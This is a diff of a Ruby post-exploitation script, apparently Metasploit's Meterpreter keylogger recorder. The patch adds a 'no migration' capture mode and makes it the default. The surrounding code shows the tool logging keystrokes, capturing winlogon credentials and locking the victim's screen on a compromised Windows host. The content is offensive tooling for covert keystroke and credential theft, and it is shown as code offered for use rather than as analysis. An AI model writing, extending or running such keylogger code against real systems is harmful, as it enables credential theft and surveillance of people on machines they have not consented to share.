@@ -8,7 +8,7 @@ session = client
 @@exec_opts = Rex::Parser::Arguments.new(
 	"-h"  => [ false, "Help menu." ],
 	"-t"  => [ true,  "Time interval in seconds between recollection of keystrokes, default 30 seconds." ],
-	"-c"  => [ true,  "Type of key capture. (0) for user key presses or (1) for winlogon credential capture Default is 0." ],
+	"-c"  => [ true,  "Type of key capture. (0) for user key presses, (1) for winlogon credential capture, or (2) for no migration.  Default is 2." ],
 	"-l"  => [ false, "Lock screen when capturing Winlogon credentials."],
 	"-k" => [ false, "Kill old Process"]
 )
@@ -40,7 +40,7 @@ logfile = logs + ::File::Separator + host + filenameinfo + ".txt"
 keytime = 30
 
 #Type of capture
-captype = 0
+captype = 2
 # Function for locking the screen -- Thanks for the idea and API call Mubix
 def lock_screen
 	print_status("Locking Screen...")
@@ -191,7 +191,11 @@ kill = false
 	end
 }
 if client.platform =~ /win32|win64/
-	if explrmigrate(session,captype,lock, kill)
+	if (captype.to_i == 2)
+		if startkeylogger(session)
+			keycap(session, keytime, logfile)
+		end
+	elsif explrmigrate(session,captype,lock, kill)
 		if startkeylogger(session)
 			keycap(session, keytime, logfile)
 		end
